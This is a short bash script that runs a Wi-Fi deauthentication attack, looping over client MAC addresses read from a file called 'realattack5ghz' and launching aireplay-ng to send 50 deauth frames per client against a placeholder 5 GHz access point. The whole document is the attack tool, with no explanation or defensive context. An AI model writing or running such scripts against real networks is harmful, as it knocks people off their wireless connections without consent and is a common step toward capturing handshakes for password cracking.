#!/bin/bash

BSSID5="00:00:00:00:00:00"
mon5ghz=adapter



for deauth in $(cat realattack5ghz); do
if [[ $deauth = "< | HWaddress" ]]; then
	echo ""
else
exec xterm -e sudo aireplay-ng -D --deauth 50 -a $BSSID5 -c $deauth $mon5ghz
fi
done

